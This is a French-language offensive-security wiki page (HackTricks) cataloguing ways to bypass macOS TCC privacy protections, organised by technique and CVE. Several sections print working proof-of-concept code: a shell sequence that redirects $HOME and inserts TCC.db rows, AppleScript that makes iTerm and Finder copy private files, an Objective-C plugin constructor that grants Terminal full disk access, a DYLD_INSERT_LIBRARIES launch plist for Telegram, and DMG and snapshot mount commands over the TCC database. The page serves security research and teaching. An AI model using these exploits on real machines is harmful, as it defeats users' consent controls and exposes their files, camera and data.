# Contournements TCC de macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Par fonctionnalité

### Contournement d'écriture

Ce n'est pas un contournement, c'est juste le fonctionnement de TCC : **Il ne protège pas contre l'écriture**. Si le Terminal **n'a pas accès pour lire le Bureau d'un utilisateur, il peut toujours y écrire** :
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'**attribut étendu `com.apple.macl`** est ajouté au nouveau **fichier** pour donner à l'**application créatrice** l'accès pour le lire.

### TCC ClickJacking

Il est possible de **mettre une fenêtre sur l'invite TCC** pour faire en sorte que l'utilisateur **l'accepte** sans s'en rendre compte. Vous pouvez trouver un PoC dans [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Demande TCC par nom arbitraire

L'attaquant peut **créer des applications avec n'importe quel nom** (par exemple, Finder, Google Chrome...) dans le **`Info.plist`** et faire en sorte qu'elle demande l'accès à un emplacement protégé par TCC. L'utilisateur pensera que l'application légitime est celle qui demande cet accès.\
De plus, il est possible de **retirer l'application légitime du Dock et d'y mettre la fausse**, donc lorsque l'utilisateur clique sur la fausse (qui peut utiliser la même icône), elle pourrait appeler la légitime, demander des autorisations TCC et exécuter un malware, faisant croire à l'utilisateur que l'application légitime a demandé l'accès.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Plus d'infos et PoC dans :

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### Contournement SSH

Par défaut, un accès via **SSH avait "Full Disk Access"**. Pour désactiver cela, vous devez l'avoir listé mais désactivé (le retirer de la liste ne supprimera pas ces privilèges) :

![](<../../../../../images/image (1077).png>)

Ici, vous pouvez trouver des exemples de la façon dont certains **malwares ont pu contourner cette protection** :

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Notez qu'à présent, pour pouvoir activer SSH, vous avez besoin de **Full Disk Access**

### Gestion des extensions - CVE-2022-26767

L'attribut **`com.apple.macl`** est donné aux fichiers pour donner à une **certaines applications des permissions pour le lire.** Cet attribut est défini lorsque l'on **fait glisser et déposer** un fichier sur une application, ou lorsqu'un utilisateur **double-clique** sur un fichier pour l'ouvrir avec l'**application par défaut**.

Par conséquent, un utilisateur pourrait **enregistrer une application malveillante** pour gérer toutes les extensions et appeler Launch Services pour **ouvrir** n'importe quel fichier (de sorte que le fichier malveillant obtienne l'accès pour le lire).

### iCloud

L'attribution **`com.apple.private.icloud-account-access`** permet de communiquer avec le service XPC **`com.apple.iCloudHelper`** qui fournira **des jetons iCloud**.

**iMovie** et **Garageband** avaient cette attribution et d'autres qui le permettaient.

Pour plus **d'informations** sur l'exploit pour **obtenir des jetons iCloud** à partir de cette attribution, consultez la conférence : [**#OBTS v5.0 : "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Une application avec la permission **`kTCCServiceAppleEvents`** pourra **contrôler d'autres applications**. Cela signifie qu'elle pourrait **abuser des permissions accordées aux autres applications**.

Pour plus d'infos sur les scripts Apple, consultez :

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Par exemple, si une application a **la permission d'automatisation sur `iTerm`**, par exemple dans cet exemple, **`Terminal`** a accès à iTerm :

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Sur iTerm

Terminal, qui n'a pas FDA, peut appeler iTerm, qui l'a, et l'utiliser pour effectuer des actions :
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Sur Finder

Ou si une application a accès à Finder, elle pourrait utiliser un script comme celui-ci :
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Par comportement de l'application

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Le **daemon tccd** de l'espace utilisateur utilise la variable d'environnement **`HOME`** pour accéder à la base de données des utilisateurs TCC depuis : **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Selon [ce post Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) et parce que le daemon TCC s'exécute via `launchd` dans le domaine de l'utilisateur actuel, il est possible de **contrôler toutes les variables d'environnement** qui lui sont passées.\
Ainsi, un **attaquant pourrait définir la variable d'environnement `$HOME`** dans **`launchctl`** pour pointer vers un **répertoire contrôlé**, **redémarrer** le **daemon TCC**, puis **modifier directement la base de données TCC** pour se donner **tous les droits TCC disponibles** sans jamais demander à l'utilisateur final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes avait accès aux emplacements protégés par TCC, mais lorsqu'une note est créée, elle est **créée dans un emplacement non protégé**. Ainsi, vous pourriez demander à Notes de copier un fichier protégé dans une note (donc dans un emplacement non protégé) et ensuite accéder au fichier :

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Le binaire `/usr/libexec/lsd` avec la bibliothèque `libsecurity_translocate` avait le droit `com.apple.private.nullfs_allow` qui lui permettait de créer un **nullfs** mount et avait le droit `com.apple.private.tcc.allow` avec **`kTCCServiceSystemPolicyAllFiles`** pour accéder à tous les fichiers.

Il était possible d'ajouter l'attribut de quarantaine à "Library", d'appeler le service XPC **`com.apple.security.translocation`** et ensuite il mapperait Library à **`$TMPDIR/AppTranslocation/d/d/Library`** où tous les documents à l'intérieur de Library pouvaient être **accessed**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** a une fonctionnalité intéressante : Lorsqu'il est en cours d'exécution, il **importe** les fichiers déposés dans **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** dans la "bibliothèque multimédia" de l'utilisateur. De plus, il appelle quelque chose comme : **`rename(a, b);`** où `a` et `b` sont :

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Ce **`rename(a, b);`** comportement est vulnérable à une **Race Condition**, car il est possible de mettre à l'intérieur du dossier `Automatically Add to Music.localized` un faux fichier **TCC.db** et ensuite, lorsque le nouveau dossier (b) est créé pour copier le fichier, de le supprimer et de le pointer vers **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="path/folder"`** signifie essentiellement que **toute base de données ouverte est copiée à ce chemin**. Dans ce CVE, ce contrôle a été abusé pour **écrire** à l'intérieur d'une **base de données SQLite** qui va être **ouverte par un processus avec FDA la base de données TCC**, puis abuser de **`SQLITE_SQLLOG_DIR`** avec un **symlink dans le nom de fichier** afin que lorsque cette base de données est **ouverte**, l'utilisateur **TCC.db est écrasé** avec celle ouverte.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Si la variable d'environnement **`SQLITE_AUTO_TRACE`** est définie, la bibliothèque **`libsqlite3.dylib`** commencera à **logger** toutes les requêtes SQL. De nombreuses applications utilisaient cette bibliothèque, il était donc possible de logger toutes leurs requêtes SQLite.

Plusieurs applications Apple utilisaient cette bibliothèque pour accéder à des informations protégées par TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Cette **variable d'environnement est utilisée par le cadre `Metal`** qui est une dépendance pour divers programmes, notamment `Music`, qui a FDA.

En définissant ce qui suit : `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Si `path` est un répertoire valide, le bug se déclenchera et nous pouvons utiliser `fs_usage` pour voir ce qui se passe dans le programme :

- un fichier sera `open()`é, appelé `path/.dat.nosyncXXXX.XXXXXX` (X est aléatoire)
- une ou plusieurs `write()` écriront le contenu dans le fichier (nous ne contrôlons pas cela)
- `path/.dat.nosyncXXXX.XXXXXX` sera `renamed()` à `path/name`

C'est un écriture de fichier temporaire, suivie d'un **`rename(old, new)`** **qui n'est pas sécurisé.**

Ce n'est pas sécurisé car cela doit **résoudre les anciens et nouveaux chemins séparément**, ce qui peut prendre un certain temps et peut être vulnérable à une condition de course. Pour plus d'informations, vous pouvez consulter la fonction `renameat_internal()` de `xnu`.

> [!CAUTION]
> Donc, en gros, si un processus privilégié renomme à partir d'un dossier que vous contrôlez, vous pourriez obtenir un RCE et le faire accéder à un fichier différent ou, comme dans ce CVE, ouvrir le fichier créé par l'application privilégiée et stocker un FD.
>
> Si le renommage accède à un dossier que vous contrôlez, tout en ayant modifié le fichier source ou en ayant un FD, vous changez le fichier (ou dossier) de destination pour pointer vers un symlink, afin que vous puissiez écrire quand vous le souhaitez.

C'était l'attaque dans le CVE : Par exemple, pour écraser le `TCC.db` de l'utilisateur, nous pouvons :

- créer `/Users/hacker/ourlink` pour pointer vers `/Users/hacker/Library/Application Support/com.apple.TCC/`
- créer le répertoire `/Users/hacker/tmp/`
- définir `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- déclencher le bug en exécutant `Music` avec cette variable d'environnement
- attraper le `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X est aléatoire)
- ici nous `open()` également ce fichier pour écrire, et nous conservons le descripteur de fichier
- échanger atomiquement `/Users/hacker/tmp` avec `/Users/hacker/ourlink` **dans une boucle**
- nous faisons cela pour maximiser nos chances de succès car la fenêtre de course est assez mince, mais perdre la course a un inconvénient négligeable
- attendre un peu
- tester si nous avons eu de la chance
- si ce n'est pas le cas, recommencer depuis le début

Plus d'infos sur [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Maintenant, si vous essayez d'utiliser la variable d'environnement `MTL_DUMP_PIPELINES_TO_JSON_FILE`, les applications ne se lanceront pas

### Apple Remote Desktop

En tant que root, vous pourriez activer ce service et l'**agent ARD aura un accès complet au disque** qui pourrait ensuite être abusé par un utilisateur pour le faire copier une nouvelle **base de données utilisateur TCC**.

## Par **NFSHomeDirectory**

TCC utilise une base de données dans le dossier HOME de l'utilisateur pour contrôler l'accès aux ressources spécifiques à l'utilisateur à **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Par conséquent, si l'utilisateur parvient à redémarrer TCC avec une variable d'environnement $HOME pointant vers un **dossier différent**, l'utilisateur pourrait créer une nouvelle base de données TCC dans **/Library/Application Support/com.apple.TCC/TCC.db** et tromper TCC pour accorder n'importe quelle permission TCC à n'importe quelle application.

> [!TIP]
> Notez qu'Apple utilise le paramètre stocké dans le profil de l'utilisateur dans l'attribut **`NFSHomeDirectory`** pour la **valeur de `$HOME`**, donc si vous compromettez une application avec des permissions pour modifier cette valeur (**`kTCCServiceSystemPolicySysAdminFiles`**), vous pouvez **armez** cette option avec un contournement TCC.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Le **premier POC** utilise [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) et [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) pour modifier le **dossier HOME** de l'utilisateur.

1. Obtenez un blob _csreq_ pour l'application cible.
2. Plantez un faux fichier _TCC.db_ avec l'accès requis et le blob _csreq_.
3. Exportez l'entrée des services d'annuaire de l'utilisateur avec [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifiez l'entrée des services d'annuaire pour changer le répertoire personnel de l'utilisateur.
5. Importez l'entrée des services d'annuaire modifiée avec [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrêtez le _tccd_ de l'utilisateur et redémarrez le processus.

Le deuxième POC a utilisé **`/usr/libexec/configd`** qui avait `com.apple.private.tcc.allow` avec la valeur `kTCCServiceSystemPolicySysAdminFiles`.\
Il était possible d'exécuter **`configd`** avec l'option **`-t`**, un attaquant pouvait spécifier un **Bundle personnalisé à charger**. Par conséquent, l'exploit **remplace** la méthode **`dsexport`** et **`dsimport`** de changement du répertoire personnel de l'utilisateur par une **injection de code configd**.

Pour plus d'infos, consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Par injection de processus

Il existe différentes techniques pour injecter du code à l'intérieur d'un processus et abuser de ses privilèges TCC :

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

De plus, la méthode d'injection de processus la plus courante pour contourner TCC trouvée est via **plugins (load library)**.\
Les plugins sont du code supplémentaire généralement sous forme de bibliothèques ou de plist, qui seront **chargés par l'application principale** et s'exécuteront sous son contexte. Par conséquent, si l'application principale avait accès à des fichiers restreints par TCC (via des permissions ou des droits accordés), le **code personnalisé l'aura également**.

### CVE-2020-27937 - Directory Utility

L'application `/System/Library/CoreServices/Applications/Directory Utility.app` avait le droit **`kTCCServiceSystemPolicySysAdminFiles`**, chargeait des plugins avec l'extension **`.daplug`** et **n'avait pas le runtime** durci.

Pour armer ce CVE, le **`NFSHomeDirectory`** est **changé** (abusant du droit précédent) afin de pouvoir **prendre le contrôle de la base de données TCC des utilisateurs** pour contourner TCC.

Pour plus d'infos, consultez le [**rapport original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Le binaire **`/usr/sbin/coreaudiod`** avait les droits `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier **permettant l'injection de code** et le second lui donnant accès à **gérer TCC**.

Ce binaire permettait de charger des **plugins tiers** depuis le dossier `/Library/Audio/Plug-Ins/HAL`. Par conséquent, il était possible de **charger un plugin et d'abuser des permissions TCC** avec ce PoC :
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-ins de la couche d'abstraction de périphérique (DAL)

Les applications système qui ouvrent un flux de caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent **dans le processus ces plugins** situés dans `/Library/CoreMediaIO/Plug-Ins/DAL` (non restreint par SIP).

Il suffit d'y stocker une bibliothèque avec le **constructeur** commun pour **injecter du code**.

Plusieurs applications Apple étaient vulnérables à cela.

### Firefox

L'application Firefox avait les droits `com.apple.security.cs.disable-library-validation` et `com.apple.security.cs.allow-dyld-environment-variables` :
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Pour plus d'informations sur la façon d'exploiter facilement cela, [**consultez le rapport original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Le binaire `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` avait les autorisations **`com.apple.private.tcc.allow`** et **`com.apple.security.get-task-allow`**, ce qui permettait d'injecter du code dans le processus et d'utiliser les privilèges TCC.

### CVE-2023-26818 - Telegram

Telegram avait les autorisations **`com.apple.security.cs.allow-dyld-environment-variables`** et **`com.apple.security.cs.disable-library-validation`**, il était donc possible d'en abuser pour **accéder à ses permissions**, comme l'enregistrement avec la caméra. Vous pouvez [**trouver le payload dans le writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Notez comment utiliser la variable d'environnement pour charger une bibliothèque, un **plist personnalisé** a été créé pour injecter cette bibliothèque et **`launchctl`** a été utilisé pour la lancer :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Par des invocations ouvertes

Il est possible d'invoquer **`open`** même en étant sandboxé

### Scripts de terminal

Il est assez courant de donner un **Accès Complet au Disque (FDA)** aux terminaux, du moins sur les ordinateurs utilisés par des personnes techniques. Et il est possible d'invoquer des scripts **`.terminal`** avec cela.

Les scripts **`.terminal`** sont des fichiers plist comme celui-ci avec la commande à exécuter dans la clé **`CommandString`** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Une application pourrait écrire un script terminal dans un emplacement tel que /tmp et le lancer avec une commande telle que :
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## En montant

### CVE-2020-9771 - contournement de TCC mount_apfs et élévation de privilèges

**Tout utilisateur** (même ceux sans privilèges) peut créer et monter un instantané de Time Machine et **accéder à TOUS les fichiers** de cet instantané.\
Le **seul privilège** requis est que l'application utilisée (comme `Terminal`) ait accès à **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), ce qui doit être accordé par un administrateur.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Une explication plus détaillée peut être [**trouvée dans le rapport original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Monter un fichier TCC

Même si le fichier de la base de données TCC est protégé, il était possible de **monter un nouveau fichier TCC.db** dans le répertoire :
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Vérifiez l'**exploitation complète** dans le [**rapport original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Comme expliqué dans le [rapport original](https://www.kandji.io/blog/macos-audit-story-part2), ce CVE a abusé de `diskarbitrationd`.

La fonction `DADiskMountWithArgumentsCommon` du framework public `DiskArbitration` effectuait les vérifications de sécurité. Cependant, il est possible de contourner cela en appelant directement `diskarbitrationd` et donc d'utiliser des éléments `../` dans le chemin et des liens symboliques.

Cela a permis à un attaquant de faire des montages arbitraires à n'importe quel endroit, y compris sur la base de données TCC en raison de l'attribution `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

L'outil **`/usr/sbin/asr`** permettait de copier l'ensemble du disque et de le monter à un autre endroit en contournant les protections TCC.

### Services de localisation

Il existe une troisième base de données TCC dans **`/var/db/locationd/clients.plist`** pour indiquer les clients autorisés à **accéder aux services de localisation**.\
Le dossier **`/var/db/locationd/` n'était pas protégé contre le montage DMG** donc il était possible de monter notre propre plist.

## Par les applications de démarrage

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Par grep

À plusieurs reprises, des fichiers stockeront des informations sensibles comme des e-mails, des numéros de téléphone, des messages... dans des emplacements non protégés (ce qui compte comme une vulnérabilité chez Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Clics synthétiques

Cela ne fonctionne plus, mais cela [**fonctionnait dans le passé**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Une autre méthode utilisant [**des événements CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Référence

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
